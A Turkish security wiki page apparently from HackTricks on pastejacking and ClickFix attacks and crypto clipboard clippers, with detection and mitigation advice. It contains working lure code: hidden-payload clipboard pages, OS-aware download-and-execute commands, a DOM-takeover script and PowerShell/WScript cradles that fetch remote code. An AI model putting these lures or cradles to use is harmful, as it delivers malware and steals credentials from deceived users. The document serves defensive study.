# Clipboard Hijacking (Pastejacking) Saldırıları

{{#include ../../banners/hacktricks-training.md}}

> "Kendinizin kopyalamadığı hiçbir şeyi asla yapıştırmayın." – eski ama hâlâ geçerli bir tavsiye

## Genel Bakış

Clipboard hijacking – *pastejacking* olarak da bilinir – kullanıcıların komutları incelemeden rutin olarak kopyalayıp yapıştırmasından yararlanır. Kötü amaçlı bir web sayfası (veya Electron ya da Desktop uygulaması gibi JavaScript çalıştırabilen herhangi bir ortam), saldırganın kontrolündeki metni programlı olarak sistem panosuna yerleştirir. Kurbanlar, genellikle dikkatle hazırlanmış sosyal mühendislik talimatlarıyla **Win + R** (Çalıştır iletişim kutusu), **Win + X** (Quick Access / PowerShell) tuşlarına basmaya veya bir terminal açıp pano içeriğini *yapıştırmaya* teşvik edilir; böylece rastgele komutlar anında çalıştırılır.

**Hiçbir dosya indirilmediği ve hiçbir ek açılmadığı** için bu teknik, ekleri, makroları veya doğrudan komut çalıştırmayı izleyen çoğu e-posta ve web içeriği güvenlik kontrolünü atlar. Bu nedenle saldırı, NetSupport RAT, Latrodectus loader veya Lumma Stealer gibi yaygın malware ailelerini dağıtan phishing kampanyalarında popülerdir.<sup>[[1]](#references)</sup>

## Wallet adresi değiştiren clipper'lar

Başka bir **clipboard hijacking** varyantı komutları hiç yapıştırmaz: kurbanın bir **cryptocurrency wallet adresi** kopyalamasını bekler, ardından yapıştırmadan hemen önce adresi sessizce saldırganın kontrolündeki başka bir adresle değiştirir. Bu yöntem, kullanıcılar genellikle yalnızca ilk ve son karakterleri doğruladığı için uzun wallet formatlarına karşı özellikle etkilidir.<sup>[[8]](#references)</sup>

Yaygın gerçek dünya özellikleri:
- **Thin loader + nested payload**: görünür app/exe meşru bir trading veya "profit" aracı gibi görünürken gerçek clipper bundle'ın daha derinlerinde gizlenir (örneğin nested Rust payload başlatan bir .NET loader).
- **Regex-driven replacement**: malware, `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` gibi dizeleri veya genel **44 karakterli Solana benzeri** dizeleri eşleştirir ve bunları saldırganın wallet'larıyla değiştirir.
- **Wallet rotation at scale**: modern Windows örnekleri, her hırsızlıktan sonra wallet itibarının zarar görmesini azaltmak için tek bir statik adres yerine currency başına **binlerce** replacement wallet içerebilir.<sup>[[8]](#references)</sup>

### Windows clipper akışı

Yaygın bir uygulama, **`AddClipboardFormatListener`** ile kaydedilen gizli bir window'dur. Her clipboard güncellemesinde malware genellikle şunları çağırır:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → mevcut clipboard verilerine erişir.
- **`GetClipboardData`** → metni okur.
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string'ini saldırganın değeriyle değiştirir.

Clipper'larda sıkça görülen minimal hunting regex'leri:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Kullanıcı düzeyinde persistence, etki yaratmak için yeterlidir. Gözlemlenen modellerden biri şöyledir:<sup>[[8]](#references)</sup>
- Payload'u **`%APPDATA%\silke\silke.exe`** konumuna kopyalama
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` altında bir **Startup-folder LNK** oluşturma

Detection fikirleri:
- Sürekli olarak clipboard API'lerini çağırırken aynı zamanda `%APPDATA%` ve kullanıcının **Startup** klasörüne yazan process'ler.
- Wallet adreslerinin clipboard üzerinde yeniden yazılmasını takip eden yeni LNK/executable oluşturma işlemleri.
- Çok sayıda kullanılmayan dosya içeren archive'lar veya fake-software bundle'ları ve iç içe bir binary başlatan küçük bir launcher.

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS'ta bazı campaign'ler bir **`unlocker.command`** helper'ı gönderir ve Gatekeeper uygulamanın hasarlı olduğunu veya unidentified bir developer'dan geldiğini söylerse kurbana sağ tıklayıp → **Open** seçmesini söyler. Script yalnızca quarantine'i kaldırır ve yakındaki `.app`'i başlatır:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Bu bir **Gatekeeper exploit'i** değildir; Gatekeeper kararlarının `com.apple.quarantine` xattr'ına bağlı olması gerçeğini kötüye kullanan **social engineering ile gerçekleştirilmiş bir quarantine bypass** yöntemidir.<sup>[[8]](#references)</sup>

Çalıştırıldıktan sonra clipper, mevcut kullanıcı olarak şunları yazarak kalıcılık sağlayabilir:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` ve `KeepAlive` içeren LaunchAgent

Yararlı bir savunma ayrıntısı, bazı örneklerin yaklaşık her 30 saniyede bir LaunchAgent'ı ve wrapper'ı yeniden yazan **self-healing watchdog** uygulamasıdır. Çalışan işlemi sonlandırmadan önce plist'i kaldırırsanız, malware onu hemen yeniden oluşturabilir.<sup>[[8]](#references)</sup> Güvenli temizleme sırası:
1. Etkin clipper işlemini sonlandırın.
2. LaunchAgent plist'ini unload edin/silin.
3. `~/launch.sh` dosyasını ve kopyalanan payload'ı silin.

### Delivery note: fake reputation as a force multiplier

Bu ailede malware teknik olarak basit kalabilir; ağır işi **distribution layer** üstlenir: sahte GitHub star/fork'ları, SourceForge review/download'ları, YouTube tutorial comment/view'ları ve güvenilir görünen VirusTotal comment/vote'ları, binary'nin çalıştırılmadan önce güvenilir görünmesini sağlamak için kullanılır.<sup>[[8]](#references)</sup>

## Zorunlu copy butonları ve gizli payload'lar (macOS one-liner'ları)

Bazı macOS infostealer'ları installer sitelerini (ör. Homebrew) klonlar ve kullanıcıların yalnızca görünür metni seçememesi için **“Copy” butonunun kullanılmasını zorunlu kılar**. Clipboard girdisi, beklenen installer command'inin yanı sıra eklenmiş bir Base64 payload'ı (ör. `...; echo <b64> | base64 -d | sh`) içerir; böylece tek bir paste her ikisini de çalıştırırken UI ek aşamayı gizler.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Daha eski kampanyalar `document.execCommand('copy')` kullanırken, daha yenileri asenkron **Clipboard API**’ye (`navigator.clipboard.writeText`) dayanır.<sup>[[2]](#references)</sup>

## ClickFix / ClearFake Akışı

1. Kullanıcı typosquatting uygulanmış veya ele geçirilmiş bir siteyi ziyaret eder (ör. `docusign.sa[.]com`)
2. Enjekte edilmiş **ClearFake** JavaScript'i, panoya sessizce Base64 kodlu bir PowerShell one-liner'ı kaydeden `unsecuredCopyToClipboard()` yardımcı işlevini çağırır.
3. HTML talimatları kurbana şunları söyler: *“**Win + R** tuşlarına basın, komutu yapıştırın ve sorunu çözmek için Enter'a basın.”*
4. `powershell.exe`, meşru bir çalıştırılabilir dosya ile kötü amaçlı bir DLL içeren bir arşivi indirerek çalıştırır (klasik DLL sideloading).
5. Loader ek aşamaların şifresini çözer, shellcode enjekte eder ve persistence kurar (ör. scheduled task) – sonuçta NetSupport RAT / Latrodectus / Lumma Stealer çalıştırılır.<sup>[[1]](#references)</sup>

### Örnek NetSupport RAT Zinciri
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (meşru Java WebStart), kendi dizininde `msvcp140.dll` arar.
* Kötücül DLL, **GetProcAddress** ile API'leri dinamik olarak çözümler, **curl.exe** aracılığıyla iki binary (`data_3.bin`, `data_4.bin`) indirir, bunların şifresini `"https://google.com/"` rolling XOR anahtarıyla çözer, nihai shellcode'u inject eder ve **client32.exe**'yi (NetSupport RAT) `C:\ProgramData\SecurityCheck_v1\` konumuna açar.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** ile `la.txt` dosyasını indirir
2. JScript downloader'ı **cscript.exe** içinde çalıştırır
3. Bir MSI payload'ı getirir → imzalı bir uygulamanın yanına `libcef.dll` bırakır → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### MSHTA üzerinden Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** çağrısı, `PartyContinued.exe` dosyasını alan gizli bir PowerShell scripti başlatır, `Boat.pst` (CAB) dosyasını çıkarır, `extrac32` ve dosya birleştirme yoluyla `AutoIt3.exe` dosyasını yeniden oluşturur ve son olarak browser kimlik bilgilerini `sumeriavgv.digital` adresine exfiltrate eden bir `.a3x` scripti çalıştırır.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Bazı ClickFix campaign'leri dosya indirmelerini tamamen atlar ve victim'ları WSH aracılığıyla JavaScript alan ve çalıştıran, kalıcılık sağlayan ve C2'yi günlük olarak değiştiren tek satırlık bir komutu yapıştırmaya yönlendirir. Gözlemlenen örnek chain:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Temel özellikler
- Casual inspection'ı engellemek için runtime sırasında tersine çevrilen Obfuscated URL.
- JavaScript, bir Startup LNK (WScript/CScript) aracılığıyla kendisini kalıcı hale getirir ve mevcut güne göre C2'yi seçer; bu da domain'lerin hızlı şekilde rotasyonunu sağlar.<sup>[[3]](#references)</sup>

C2'leri tarihe göre döndürmek için kullanılan minimal JS parçası:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Sonraki aşamada genellikle persistence sağlayan ve bir RAT (ör. PureHVNC) indiren bir loader deploy edilir; bu loader çoğu zaman TLS'i hardcoded bir sertifikaya pinler ve trafiği parçalara böler.<sup>[[3]](#references)</sup>

Bu varyanta özgü detection fikirleri
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (veya `cscript.exe`).
- Startup artefact'ları: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` altında, `%TEMP%`/`%APPDATA%` altındaki bir JS path'i ile WScript/CScript'i çalıştıran LNK.
- `.split('').reverse().join('')` veya `eval(a.responseText)` içeren Registry/RunMRU ve command-line telemetry.
- Uzun command line'lar kullanmadan uzun script'leri beslemek için büyük stdin payload'larıyla tekrarlanan `powershell -NoProfile -NonInteractive -Command -`.
- Daha sonra updater görünümü veren bir task/path altında (ör. `\GoogleSystem\GoogleUpdater`) `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` gibi LOLBin'leri çalıştıran Scheduled Task'lar.

Threat hunting
- Günlük olarak değişen C2 hostname'leri ve `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern'ine sahip URL'ler.
- Clipboard write event'lerini, ardından Win+R paste işlemini ve hemen sonrasında gerçekleşen `powershell.exe` çalıştırmasını correlate edin.

Blue-team'ler, pastejacking abuse'unu tespit etmek için clipboard, process-creation ve registry telemetry'yi birlikte kullanabilir:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`, **Win + R** command'larının geçmişini tutar; alışılmadık Base64 / obfuscated entry'leri arayın.
* `ParentImage` == `explorer.exe` ve `NewProcessName` değerinin { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } kümesinde olduğu Security Event ID **4688** (Process Creation).
* Şüpheli 4688 event'inden hemen önce `%LocalAppData%\Microsoft\Windows\WinX\` veya temporary folder'lar altında gerçekleşen file creation'lar için Event ID **4663**.
* EDR clipboard sensor'ları (mevcutsa) – `Clipboard Write` event'ini hemen ardından oluşturulan yeni bir PowerShell process'iyle correlate edin.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Son kampanyalar, kullanıcıları clipboard'larından OS-specific command'ları native console'lara kopyalamaya zorlayan sahte CDN/browser verification page'lerini ("Just a moment…", IUAM-style) toplu olarak üretiyor. Bu yöntem execution'ı browser sandbox'ının dışına taşır ve Windows ile macOS genelinde çalışır.<sup>[[4]](#references)</sup>

Builder tarafından oluşturulan page'lerin temel özellikleri
- Payload'ları uyarlamak için `navigator.userAgent` üzerinden OS detection (Windows PowerShell/CMD ile macOS Terminal). İllüzyonu korumak için desteklenmeyen OS'ler için optional decoy/no-op'lar.
- Zararsız UI action'larında (checkbox/Copy) automatic clipboard-copy; görünür text, clipboard içeriğinden farklı olabilir.
- Mobile blocking ve step-by-step instructions içeren bir popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Compromised bir site'nin DOM'unu Tailwind-styled bir verification UI ile overwrite etmek için optional obfuscation ve single-file injector (yeni domain registration'ı gerekmez).<sup>[[4]](#references)</sup>

Örnek: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS ilk çalıştırma kalıcılığı
- Terminal kapandıktan sonra çalıştırmanın devam etmesini ve görünür izlerin azalmasını sağlamak için `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` kullanın.<sup>[[4]](#references)</sup>

Ele geçirilmiş sitelerde sayfa üzerinde takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM tarzı lure'lara özgü Detection ve hunting fikirleri
- Web: Clipboard API'yi verification widget'larına bağlayan sayfalar; görüntülenen metin ile clipboard payload arasındaki uyumsuzluk; `navigator.userAgent` dallanması; şüpheli bağlamlarda Tailwind + single-page replace.
- Windows uç noktası: Bir browser etkileşiminden kısa süre sonra `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` konumundan çalıştırılan batch/MSI installer'ları.
- macOS uç noktası: Browser olaylarının yakınında Terminal/iTerm'ın `bash`/`curl`/`base64 -d` çalıştırması; terminal kapatıldıktan sonra da devam eden arka plan işleri.
- `RunMRU` Win+R geçmişini ve clipboard yazmalarını, sonrasında oluşturulan console process'leri ile ilişkilendirin.

Destekleyici teknikler için ayrıca bkz.

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evrimleri (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sitelerini compromise etmeye ve harici host'ları (Cloudflare Workers, GitHub/jsDelivr) zincirleyen loader JavaScript enjekte etmeye devam ediyor; ayrıca güncel lure mantığını çekmek için blockchain “etherhiding” çağrılarını (ör. `bsc-testnet.drpc[.]org` gibi Binance Smart Chain API endpoint'lerine POST istekleri) bile kullanıyor. Son overlay'ler, herhangi bir şey download etmek yerine kullanıcıları tek satırlık bir komutu kopyalayıp yapıştırmaya (T1204.004) yönlendiren sahte CAPTCHA'ları yoğun şekilde kullanıyor.<sup>[[6]](#references)</sup>
- Initial execution giderek signed script host'larına/LOLBAS'a devrediliyor. Ocak 2026 zincirleri, daha önceki `mshta` kullanımının yerine, uzak içeriği çekmek için alias/wildcard içeren PowerShell benzeri argümanlarla `WScript.exe` üzerinden çalıştırılan yerleşik `SyncAppvPublishingServer.vbs` kullanımına geçti:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` imzalıdır ve normalde App-V tarafından kullanılır; `WScript.exe` ve alışılmadık bağımsız değişkenlerle (`gal`/`gcm` takma adları, wildcard kullanılan cmdlet'ler, jsDelivr URL'leri) birlikte kullanıldığında ClearFake için yüksek sinyalli bir LOLBAS aşamasına dönüşür.<sup>[[6]](#references)</sup>
- Şubat 2026'da sahte CAPTCHA payload'ları yeniden saf PowerShell download cradles kullanımına kaydı. İki canlı örnek:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- İlk zincir bellek içi bir `iex(irm ...)` grabber'dır; ikinci zincir `WinHttp.WinHttpRequest.5.1` üzerinden stage eder, geçici bir `.ps1` dosyası yazar ve ardından gizli bir pencerede `-ep bypass` ile çalıştırır.<sup>[[6]](#references)</sup>

Bu varyantlar için tespit/avlama ipuçları
- Process lineage: tarayıcı → `explorer.exe` → clipboard yazma/Win+R işlemlerinden hemen sonra `wscript.exe ...SyncAppvPublishingServer.vbs` veya PowerShell cradle'ları.
- Command-line anahtar kelimeleri: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domain'leri veya ham IP `iex(irm ...)` kalıpları.
- Network: web browsing sonrasında script host'larından/PowerShell'den CDN worker host'larına veya blockchain RPC endpoint'lerine giden outbound bağlantılar.
- File/registry: `%TEMP%` altında geçici `.ps1` oluşturulması ve bu one-liner'ları içeren RunMRU girdileri; signed-script LOLBAS'ların (WScript/cscript/mshta) external URL'lerle veya obfuscated alias string'lerle çalıştırılmasını block/alert edin.

## Haziran 2026 ClickFix tradecraft: paste telemetrisi, sahte doğrulama yorumları ve LOLBin zincirleme kullanımı

Recent Red Canary telemetrisi, kararlı göstergenin **tek bir exact command olmadığını**, bunun yerine **user-assisted paste-and-run**, **trusted interpreter'lar/LOLBins**, **obfuscated flag'ler**, **remote retrieval** ve **immediate execution** birleşimi olduğunu gösteriyor.<sup>[[7]](#references)</sup>

### Dikkat çeken operator kalıpları

- **Paste confirmation telemetrisi**: bazı payload'lar gerçek stage'den önce `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` çağrısı yapar. Bu, pencereyi kısa ve sessiz tutarken kullanıcı etkileşimini doğrular.
- **Sahte verification yorumları**: PowerShell one-liner'ları, komut Run / `cmd.exe` / PowerShell history'sine paste edildikten sonra hâlâ CAPTCHA ile ilişkili görünmesi için `# Security check ✔️ I'm not a robot Verification ID: 138105` gibi string'ler ekleyebilir.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line'da static URL bulunmasını önlerken bellek içi download-and-execute işlemini sürdürür.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q`, kırılgan detection'ları atlatmak için flag'lerde unusual casing ve Unicode-like character'ları kötüye kullanırken hâlâ `msiexec.exe`'ye benzer.
- **Caret-escaped LOLBin zincirleri**: `cmd.exe`, `^` escape'leriyle (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) keyword'leri gizleyebilir, nested shell'i minimized olarak başlatabilir, attacker içeriğini `.pdf` gibi benign bir extension ile kaydedebilir ve ardından `mshta` üzerinden çalıştırabilir.<sup>[[7]](#references)</sup>
## Azaltımlar

1. Browser hardening – clipboard write-access'i (`dom.events.asyncClipboard.clipboardItem` vb.) devre dışı bırakın veya user gesture gerektirin.
2. Security awareness – kullanıcılara hassas command'ları *type* etmeyi veya önce bir text editor'a paste etmeyi öğretin.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control kullanarak arbitrary one-liner'ları block edin.
4. Network controls – bilinen pastejacking ve malware C2 domain'lerine giden outbound request'leri block edin.

## İlgili Teknikler

* **Discord Invite Hijacking**, kullanıcıları malicious bir server'a çekme sonrasında sıklıkla aynı ClickFix yaklaşımını kötüye kullanır:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Fix the Click: ClickFix Attack Vector'ını Önleme](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtain'ın Altında: RAT'ten Builder'a, Builder'dan Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: IUAM ClickFix Generator'ının İlk Keşfi](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer yılı](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Şubat 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Haziran 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Stars'tan Upvote'lara: Bir Crypto Clipboard Hijacker'ı Besleyen Sahte Reputation](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
